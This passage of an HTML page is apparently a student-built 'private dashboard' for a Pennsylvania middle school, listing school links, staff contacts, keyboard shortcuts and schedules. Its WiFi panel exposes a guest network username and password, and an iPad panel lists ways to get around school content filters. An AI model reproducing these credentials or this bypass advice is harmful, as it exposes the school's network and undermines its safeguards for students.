    .notification-alert.reminder-urgent {
      background-color: var(--error-color);
      color: white;
      animation: slideInRight 0.5s ease-out, pulseUrgent 0.8s infinite alternate; /* Keep pulsing */
    }

    @keyframes slideInRight {
      from { opacity: 0; transform: translateX(100%); }
      to { opacity: 1; transform: translateX(0); }
    }

    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; }
    }

    @keyframes pulseUrgent {
      0% { box-shadow: 0 0 10px rgba(255, 76, 76, 0.7); }
      50% { box-shadow: 0 0 20px rgba(255, 76, 76, 1); }
      100% { box-shadow: 0 0 10px rgba(255, 76, 76, 0.7); }
    }

    .notification-alert .close-btn {
      background: none;
      border: none;
      color: inherit;
      font-size: 1.2em;
      cursor: pointer;
      margin-left: 10px;
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts. Access to system requires reset code.</p>
      <input type="password" id="resetField" placeholder="Enter Admin Reset Code" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6-Enhanced</div>
    </div>

    <!-- Quick Access Bar -->
    <div class="quick-bar">
      <button id="sessionTime">‚è≥ Session Time: 00:00:00</button>
      <button id="realTimeClock">üïí --:--:--</button>
      <button id="realDate">üìÖ --</button>
      <button id="notesBtn">üìí Notes</button>
      <button id="exportNotesBtn">üíæ Export Notes</button>
      <button id="screenshotBtn">üì∏ Screenshot</button>
      <button id="toggleSectionsBtn">‚¨ÜÔ∏è Toggle Sections</button>
      <button id="fixIssuesBtn">üõ†Ô∏è Fix Issues</button>
      <button id="fullScreenBtn">üñ•Ô∏è Full Screen</button>
      <button id="zoomInBtn">‚ûï Zoom In</button>
      <button id="zoomOutBtn">‚ûñ Zoom Out</button>
      <button id="restartBtn">üîÑ Restart</button>
      <button id="panicBtn">üö® Panic</button>
      <button id="themeToggle">üåô Dark Mode</button>
      <button id="logoutBtn">üîì Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>üö® Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! Important system maintenance scheduled for next Friday. Please review the Academic Calendar for holiday schedules. New security patches deployed! üö®</span>
    </div>
    
    <!-- Main Content Row -->
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>üìÖ Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "The only way to do great work is to love what you do." ‚Äì Steve Jobs
      </div>
    </div>

    <!-- Updates & Notifications -->
    <div id="updatesNotifications" style="display: flex; gap: 25px; justify-content: center; flex-wrap: wrap; margin-top: 25px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>üîÑ Latest Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">Reminder System v1.0 Launched!</div>
        <div class="update-entry">Optimized Canvas Performance</div>
        <div class="update-entry">Improved Login Security Protocols</div>
        <div class="update-entry">Added new "Academics" section</div>
        <div class="update-entry">Integrated Productivity Tools</div>
        <div class="update-entry">Enhanced Theme Customization</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>üîî System Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
        <p>New Academic Assignments due next week. Check the 'Assignments' section.</p>
        <p>Your session time has exceeded 2 hours. Remember to take breaks!</p>
        <p>Reminder: Club Fair is scheduled for this Thursday in the main gym.</p>
        <p>Security Alert: Ensure your browser is up-to-date for optimal protection.</p>
      </div>
    </div>

    <!-- New Categorized Control Buttons -->
    <div class="main-control-buttons-container">

      <!-- School Information Category -->
      <div class="dashboard-category-section">
        <h2>üåê School & System Information</h2>
        <div class="dashboard-category-buttons">
          <button onclick="dashboard.togglePanel('wifiPanel')">üì° School WiFi Info</button>
          <button onclick="dashboard.togglePanel('ipadPanel')">üì± iPad Restrictions</button>
          <button onclick="dashboard.togglePanel('handbookPanel')">üìò Student Handbooks</button>
          <button onclick="dashboard.togglePanel('mapPanel')">üó∫Ô∏è School Map</button>
          <button onclick="dashboard.togglePanel('studentWebsitesPanel')">üìö Student Websites</button>
          <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">üë©‚Äçüè´ Teacher Websites</button>
          <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">üìû Phone Directory</button>
          <button onclick="dashboard.togglePanel('cameraPanel')">üìπ School Cameras</button>
          <button onclick="dashboard.togglePanel('schoolInfoPanel')">üè´ General School Info</button>
          <button onclick="dashboard.togglePanel('keyboardPanel')">‚å®Ô∏è Keyboard Tricks</button>
        </div>
      </div>

      <!-- Academic Tools Category -->
      <div class="dashboard-category-section">
        <h2>üéì Academic & Learning Tools</h2>
        <div class="dashboard-category-buttons">
          <button onclick="dashboard.togglePanel('classesPanel')">üìù My Classes</button>
          <button onclick="dashboard.togglePanel('gradesPanel')">üíØ Grades Viewer</button>
          <button onclick="dashboard.togglePanel('assignmentsPanel')">üìñ Assignments & Due Dates</button>
          <button onclick="dashboard.togglePanel('studyResourcesPanel')">üß† Study Resources</button>
          <button onclick="dashboard.togglePanel('courseCatalogPanel')">üìë Course Catalog</button>
          <button onclick="dashboard.togglePanel('attendancePanel')"> ÿ≠ÿ∂Ÿàÿ± Ÿà ÿ∫€åÿßÿ® Attendance </button>
        </div>
      </div>

      <!-- Student Life & Support Category -->
      <div class="dashboard-category-section">
        <h2>üéâ Student Life & Support</h2>
        <div class="dashboard-category-buttons">
          <button onclick="dashboard.togglePanel('clubsActivitiesPanel')">ü§ù Clubs & Activities</button>
          <button onclick="dashboard.togglePanel('sportsTeamsPanel')">‚öΩ Sports Teams</button>
          <button onclick="dashboard.togglePanel('schoolEventsPanel')">üóìÔ∏è School Events</button>
          <button onclick="dashboard.togglePanel('newsAnnouncementsPanel')">üì¢ News & Announcements</button>
          <button onclick="dashboard.togglePanel('counselingServicesPanel')">üéóÔ∏è Counseling Services</button>
          <button onclick="dashboard.togglePanel('disciplineRecordsPanel')"> üö® Discipline Records </button>
        </div>
      </div>

      <!-- Productivity & Utilities Category -->
      <div class="dashboard-category-section">
        <h2>üõ†Ô∏è Productivity & Utilities</h2>
        <div class="dashboard-category-buttons">
          <button onclick="dashboard.togglePanel('reminderPanel')">üîî Reminder System</button>
          <button onclick="dashboard.togglePanel('taskManagerPanel')">‚úÖ Task Manager</button>
          <button onclick="dashboard.togglePanel('pomodoroPanel')">üçÖ Pomodoro Timer</button>
          <button onclick="dashboard.togglePanel('calculatorPanel')">üßÆ Calculator</button>
          <button onclick="dashboard.togglePanel('unitConverterPanel')">üìè Unit Converter</button>
          <button onclick="dashboard.togglePanel('virtualAssistantPanel')">ü§ñ Virtual Assistant</button>
        </div>
      </div>

      <!-- Advanced Tools & Customization Category -->
      <div class="dashboard-category-section">
        <h2>‚öôÔ∏è Advanced Tools & Customization</h2>
        <div class="dashboard-category-buttons">
          <button onclick="dashboard.togglePanel('exploitPanel')">üß® Exploiting Tools</button>
          <button onclick="dashboard.togglePanel('bypassPanel')">üö™ Bypassing Tools</button>
          <button onclick="dashboard.togglePanel('vpnPanel')">üîê VPN Websites</button>
          <button onclick="dashboard.togglePanel('gamingPanel')">üéÆ Gaming Websites</button>
          <button onclick="dashboard.togglePanel('musicPanel')">üéµ Music Websites</button>
          <button onclick="dashboard.togglePanel('maintenanceRequestsPanel')">üîß Maintenance Request</button>
          <button onclick="dashboard.togglePanel('itSupportPanel')">üíª IT Support</button>
          <button onclick="dashboard.togglePanel('profileSettingsPanel')">üë§ Profile Settings</button>
          <button onclick="dashboard.togglePanel('dashboardCustomizationPanel')">üé® Dashboard Customization</button>
        </div>
      </div>
    </div>


    <!-- Information Panels (Existing and New) -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>üì° School WiFi Information</h2>
        <h3>Available Networks</h3>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>

        <h3>WiFi Access Guidelines</h3>
        <div class="info-text">
          <p>Access to 'Middletown_Core' and 'Mtown_Core' is restricted to authenticated faculty and staff members only. These networks offer the highest level of security and performance.</p>
          <p>'Mtown Guest' is available for visitors with limited bandwidth and monitoring. Credentials for this network are provided upon request at the main office.</p>
          <p>Please report any suspicious network activity or unauthorized access attempts to IT support immediately. Misuse of school network resources may result in disciplinary action.</p>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>üì± School iPad Restrictions</h2>
        <h3>Manage iPad Settings and Bypasses</h3>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions Implemented</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Known Bypasses</button>
          <button onclick="dashboard.showIpadContent('updates')">Restriction Updates</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content active-content">
          <h3>Current iPad Restrictions</h3>
          <ul>
            <li>App Store access is restricted to approved educational apps.</li>
            <li>Safari content filtering is enabled for safe browsing.</li>
            <li>Camera access is controlled by teacher supervision.</li>
            <li>Bluetooth is disabled during class hours.</li>
            <li>Installation of unapproved profiles is blocked.</li>
            <li>iMessage and FaceTime are disabled.</li>
            <li>AirDrop is restricted to contacts only.</li>
            <li>Certain websites and categories are blocked across all networks.</li>
          </ul>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <h3>Available iPad Bypasses (Use at your own risk)</h3>
          <p>
            While the school implements various restrictions, some methods may temporarily bypass certain limitations.
            These methods are often patched, so their effectiveness may vary.
            Using these bypasses may violate school policy and lead to disciplinary action.
          </p>
          <ul>
            <li><strong>VPN Method:</strong> Utilize a trusted VPN app to bypass network content filtering. (Effectiveness: High, Risk: Medium)</li>
            <li><strong>Proxy Server:</strong> Access blocked websites through an unblocked proxy server. (Effectiveness: Medium, Risk: Medium)</li>
            <li><strong>Guest Network:</strong> Connect to 'Mtown Guest' for slightly less stringent filtering, but still monitored. (Effectiveness: Low, Risk: Low)</li>
            <li><strong>Offline Mode:</strong> Some apps may function with cached content offline, bypassing network restrictions. (Effectiveness: Low, Risk: Low)</li>
            <li><strong>DNS Over HTTPS (DoH):</strong> Configure a custom DNS resolver in network settings (if allowed) to bypass some DNS-level blocks. (Effectiveness: Medium, Risk: Medium)</li>
          </ul>
        </div>

        <div id="ipadUpdates" class="ipad-content">
          <h3>Recent Updates & Patches</h3>
          <p><strong>March 15, 2024:</strong> Patched "Safari Reader Mode" bypass for restricted websites.</p>
          <p><strong>February 28, 2024:</strong> Enhanced app installation monitoring, preventing side-loading of unapproved apps.</p>
          <p><strong>January 10, 2024:</strong> Updated content filtering definitions to block new proxy sites.</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>üìò Student Handbooks Information</h2>
        <h3>Official School Policy Documents</h3>
        <div class="handbook-buttons list-grid-2">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Attendance%20Policy%202024-2025.pdf" target="_blank">Attendance Policy (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Technology%20Acceptable%20Use%20Policy.pdf" target="_blank">Technology Acceptable Use Policy</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>üó∫Ô∏è School Building Map Information</h2>
        <h3>Interactive School Maps</h3>
        <p>Explore the Middletown Area Middle School layout.</p>
        <div class="coming-soon">
          Interactive Building Map with Room Numbers Coming Soon!
          <p>Please check back later for detailed floor plans and navigation.</p>
        </div>
        <div class="info-text">
          <p><strong>Temporary Text Map Overview:</strong></p>
          <p><strong>First Floor:</strong> Main Office, Library, Cafeteria, Gymnasium, Art Rooms, Music Rooms, Science Labs (Rooms 101-115).</p>
          <p><strong>Second Floor:</strong> English Classrooms, Math Classrooms, Computer Labs, Special Education Classrooms (Rooms 201-225).</p>
          <p><strong>Third Floor:</strong> Social Studies Classrooms, Foreign Language Classrooms, Administration Offices, Counselor's Office (Rooms 301-318).</p>
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>üìö Student Website's Information</h2>
        <h3>Key Online Resources for Students</h3>
        <div class="links-list list-grid-3">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb (Official)</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace (Support)</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login (SSO)</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Pearson)</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements (YouTube)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance (College/Career)</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library Search</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool Student Portal</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic Learning</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say PA (Safety Reporting)</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail (Student Email)</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour Yearbooks</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Assessments)</a>
          <a href="https://middletownsd.finalforms.com/" target="_blank">FinalForms (Athletics)</a>
          <a href="https://www.office.com/" target="_blank">Microsoft 365</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>üë©‚Äçüè´ Teacher Websites Information</h2>
        <h3>Important Portals for Educators</h3>
        <div class="links-list list-grid-3">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda (Security)</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey (Supplies)</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher Login)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace (Support)</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher SSO)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX (Facilities Mgt)</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram (Health)</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline (Absence Mgt)</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance (Counseling)</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library (Teacher)</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP (Evaluations)</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher Portal)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic (Teacher)</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS (Curriculum)</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps (Behavior)</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox (IT Support)</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools (Training)</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365 (Email)</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>üìû School Phone Directory Information</h2>
        <h3>Key Contacts for Middletown Area Middle School</h3>
        <p>This directory provides essential contact numbers for various departments and personnel.</p>
        <div class="coming-soon">
          Detailed Phone Directory with Department Extensions and Staff Contacts Coming Soon!
          <p>For urgent inquiries, please call the main office at 717-930-0739.</p>
        </div>
        <div class="info-text">
          <p><strong>Main Office:</strong> 717-930-0739</p>
          <p><strong>Attendance Office:</strong> 717-930-0739 (Ext. 100)</p>
          <p><strong>Counseling Office:</strong> 717-930-0739 (Ext. 120)</p>
          <p><strong>Athletic Department:</strong> 717-930-0739 (Ext. 150)</p>
          <p><strong>IT Support:</strong> 717-930-0739 (Ext. 180)</p>
          <p><strong>Nurse's Office:</strong> 717-930-0739 (Ext. 130)</p>
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>üì∑ School Camera Information</h2>
        <h3>School Security Camera System Overview</h3>
        <p>Information regarding the school's surveillance system for safety and security purposes.</p>
        <div class="coming-soon">
          Access to Camera Locations and Policies Coming Soon
          <p>The school utilizes a comprehensive security camera system to ensure the safety of all students and staff. Footage is monitored by authorized personnel only and is used for security and incident investigation purposes. Unauthorized access to camera feeds is strictly prohibited.</p>
        </div>
        <div class="info-text">
          <p><strong>Coverage Areas:</strong> All hallways, main entrances and exits, cafeteria, gymnasium, parking lots, and perimeter areas are under surveillance.</p>
          <p><strong>Recording:</strong> All cameras record 24/7. Footage is stored for a limited period before being overwritten.</p>
          <p><strong>Access:</strong> Access to live and recorded footage is limited to school administration, authorized security personnel, and law enforcement when necessary.</p>
          <p><strong>Privacy:</strong> Cameras are not located in restrooms or changing areas. Student privacy is respected while maintaining a secure environment.</p>
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>üè´ School Information</h2>
        <h3>General Details for Middletown Area Middle School</h3>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School District:</div>
            <div>Middletown Area School District</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Grades Served:</div>
            <div>6th - 8th Grade</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Mascot:</div>
            <div>Raiders</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Colors:</div>
            <div>Red and White</div>
          </div>
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>üéπ Keyboard Tricks (iPad/Mac Based)</h2>
        <h3>Useful Shortcuts for Productivity</h3>
        <div class="info-text">
          <p>System Shortcuts:
‚Ä¢ Access Spotlight Search: Press¬†Command (‚åò) + Space bar.
‚Ä¢ Return to the Home screen: Press¬†Command (‚åò) + H.
‚Ä¢ Show the Dock: Press¬†Command (‚åò) + Option (‚å•) + D.
‚Ä¢ Show the App Library: Press¬†Shift (‚áß) + Globe + A.
‚Ä¢ Open Quick Note: Press Globe + Q.
‚Ä¢ Open Siri: Press Globe + S.
‚Ä¢ Open Control Center: Press Globe + C.
‚Ä¢ Open Notification Center: Press Globe + N.
‚Ä¢ Show all windows: Press¬†Globe + Down Arrow.
‚Ä¢ Open the App Switcher: Press¬†Globe + Up Arrow.
Multitasking Shortcuts:
‚Ä¢ Switch to the last active app: Press¬†Command (‚åò) + Tab.
‚Ä¢ View all active apps: Press and hold Command (‚åò) + Tab.
‚Ä¢ Open Split View: Press Control (‚åÉ) + Globe + Left Arrow to move an app to the left, or Control (‚åÉ) + Globe + Right Arrow to move it to the right.
‚Ä¢ Switch the position of apps in Split View: Press¬†Control (‚åÉ) + Globe + Left or Right Arrow.
‚Ä¢ Open Slide Over: Press Globe + Backslash.
‚Ä¢ Move the Slide Over window: Press¬†Option (‚å•) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
‚Ä¢ Take a full-screen screenshot: Press¬†Command (‚åò) + Shift + 3.
‚Ä¢ Take a screenshot and enter markup immediately: Press¬†Command (‚åò) + Shift + 4.
‚Ä¢ Open a new private tab: Press¬†Command (‚åò) + Shift + N.
‚Ä¢ Open a new tab: Press Command (‚åò) + T or Command (‚åò) + N.
‚Ä¢ Close the current tab: Press Command (‚åò) + W.
‚Ä¢ Close all tabs in Tab Grid: Press Shift + Command (‚åò) + W.
‚Ä¢ Go to the next tab: Press Option (‚å•) + Command (‚åò) + Right Arrow, or Control (‚åÉ) + Tab, or Command (‚åò) + }.
‚Ä¢ Go to the previous tab: Press Option (‚å•) + Command (‚åò) + Left Arrow, or Shift + Control (‚åÉ) + Tab, or Command (‚åò) + {.
‚Ä¢ Reopen the last closed tab: Press¬†Shift + Command (‚åò) + T.
‚Ä¢ Go to a specific tab (1-8): Press¬†Command (‚åò) + (1-8).
‚Ä¢ Go to the last tab: Press Command (‚åò) + 9.
‚Ä¢ Open the Tab Grid: Press Shift + Command (‚åò) + .
‚Ä¢ Open a new Incognito tab: Press¬†Shift + Command (‚åò) + N.
‚Ä¢ Open a new Incognito window: Press¬†Option (‚å•) + Shift + Command (‚åò) + N.
‚Ä¢ Open a new window: Press¬†Option (‚å•) + Command (‚åò) + N.
General Navigation and Text Editing:
‚Ä¢ Navigate between elements in an app (like fields, lists, buttons): Press Tab.
‚Ä¢ Select all text: Press Command (‚åò) + A.
‚Ä¢ Copy selected text: Press Command (‚åò) + C.
‚Ä¢ Cut selected text: Press Command (‚åò) + X.
‚Ä¢ Paste copied text: Press Command (‚åò) + V.
‚Ä¢ Undo the last action: Press Command (‚åò) + Z.
‚Ä¢ Redo the last undone action: Press Command (‚åò) + Shift + Z.
‚Ä¢ Jump to the top of a page: Press Command (‚åò) + Up Arrow.
‚Ä¢ Jump to the bottom of a page: Press Command (‚åò) + Down Arrow.
‚Ä¢ Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using,¬†press and hold the Command (‚åò) key.¬†For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- NEW PANELS START HERE -->

      <!-- Classes & Schedule Panel -->
      <div id="classesPanel" class="info-panel">
        <h2>üìù My Classes & Schedule</h2>
        <h3>Your Current Academic Schedule</h3>
        <div id="scheduleContent" class="schedule-content active-content">
          <p>Here is your current class schedule for the academic year.</p>
          <div class="list-grid-2">
            <div class="schedule-item">
              <strong>Period 1:</strong> Math (Room 205)<br><small>Teacher: Ms. Davis - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
              <strong>Period 2:</strong> English Language Arts (Room 210)<br><small>Teacher: Mr. Thompson - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
              <strong>Period 3:</strong> Science - Biology (Lab 1)<br><small>Teacher: Dr. Chen - <a href="#" target="_blank">Class Page</a></small>
            </div>
            <div class="schedule-item">
